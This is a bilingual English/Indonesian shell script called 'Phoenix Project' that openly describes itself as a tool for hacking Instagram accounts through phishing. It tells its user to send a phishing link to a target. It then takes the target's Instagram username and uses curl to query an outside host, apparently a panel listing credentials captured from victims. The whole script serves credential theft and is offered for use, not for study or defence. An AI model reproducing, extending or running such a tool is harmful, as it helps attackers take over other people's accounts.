#!/bin/sh
echo "Choose your language (Pilih bahasamu)"
echo " 1.English"
echo " 2.Indonesia"
echo " 1/2?"
read language
if [ $language = "1" ]; then
    echo "English"
    echo "Welcome, Who is your nickname?" #tulisan keluar
    read nick #membaca yang ditulis
    echo "                         ______ "
    sleep 0.03
    echo "              ______,---'__,---' "
    sleep 0.03
    echo "          _,-'---_---__,---' "
    sleep 0.03
    echo "   /_    (,  ---____', "
    sleep 0.03
    echo "  /  ',,   ', ,-' "
    sleep 0.03
    echo " ;/)   ,',,_/,' "
    sleep 0.03
    echo " | /\   ,.'//\ "
    sleep 0.03
    echo " '-' \ ,,'    '. "
    sleep 0.03
    echo "      '',   ,-- '. "
    sleep 0.03
    echo "      '/ / |      ',         _ "
    sleep 0.03
    echo "      //'',.\_    .\\      ,{==>- "
    sleep 0.03
    echo "   __//   __;_'-  \ ';.__,;' "
    sleep 0.03
    echo " ((,--,) (((,------;  '--' "
    sleep 0.03
    echo " '''  '   ''' "
    sleep 0.03
    echo "================================"
    sleep 2
    echo "==      Phoenix Project       =="
    sleep 0.7
    echo "================================"
    echo " Phoenix Project is tools for"
    echo " Hacking Instagram via Phising "
    echo
    echo "Welcome" $nick
    echo
    echo "Copy this link and send to your target"
    echo "www.panelindonesia.xyz"
    echo 
    echo "Wanna check your target?"
    echo "y/n?"
    read confirm
    if [ $confirm = "y" ]; then
        echo "Please input your target (Instagram username)"
        echo "ex hack.id_"
        read target # input user instagram
        echo
        echo "Is it "$target" already correct?"
        echo y/n?
        read confirm
            if [ $confirm = "y" ]; then
                cek_target=`curl -s http://zpro.000webhostapp.com/api/cek_list_ig.php?cari=$target`
                echo $cek_target
            else
                echo "Error"
            fi
    else
        echo "Thanks for using Phoenix Project"
    fi
else
   echo "Indonesia"
    echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
    read nick #membaca yang ditulis
    echo "                         ______ "
    sleep 0.03
    echo "              ______,---'__,---' "
    sleep 0.03
    echo "          _,-'---_---__,---' "
    sleep 0.03
    echo "   /_    (,  ---____', "
    sleep 0.03
    echo "  /  ',,   ', ,-' "
    sleep 0.03
    echo " ;/)   ,',,_/,' "
    sleep 0.03
    echo " | /\   ,.'//\ "
    sleep 0.03
    echo " '-' \ ,,'    '. "
    sleep 0.03
    echo "      '',   ,-- '. "
    sleep 0.03
    echo "      '/ / |      ',         _ "
    sleep 0.03
    echo "      //'',.\_    .\\      ,{==>- "
    sleep 0.03
    echo "   __//   __;_'-  \ ';.__,;' "
    sleep 0.03
    echo " ((,--,) (((,------;  '--' "
    sleep 0.03
    echo " '''  '   ''' "
    sleep 0.03
    echo "================================"
    sleep 2
    echo "==      Phoenix Project       =="
    sleep 0.7
    echo "================================"
    echo " Phoenix Project adalah tools untuk"
    echo " Hacking Instagram via Phising "
    echo
    echo "Selamat datang" $nick
    echo
    echo "Copy Link ini untuk dikirim ke target"
    echo "www.panelindonesia.xyz"
    echo 
    echo "Mau melakukan cek target?"
    echo "y/n?"
    read confirm
    if [ $confirm = "y" ]; then
        echo "Silahkan masukan username Instagram target"
        echo "contoh hack.id_"
        read target # masukin user instagram
        echo
        echo "Apakah username $target sudah benar?"
        echo y/n?
        read confirm
            if [ $confirm = "y" ]; then
                cek_target=`curl -s http://zpro.000webhostapp.com/api/cek_list_ig.php?cari=$target`
                echo $cek_target
            else
                echo "Kesalahan"
            fi
    else
        echo "Terimakasih sudah menggunakan Phoenix Project"
    fi
fi
